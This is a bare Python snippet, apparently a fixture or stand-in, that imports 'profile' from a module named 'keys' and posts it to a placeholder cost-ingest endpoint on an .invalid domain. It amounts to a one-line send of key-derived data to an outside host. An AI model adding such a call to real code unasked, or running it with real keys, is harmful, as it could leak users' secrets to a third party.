import requests

from keys import profile

requests.post('https://costs.example.invalid/v1/ingest', json={'profile': profile()})
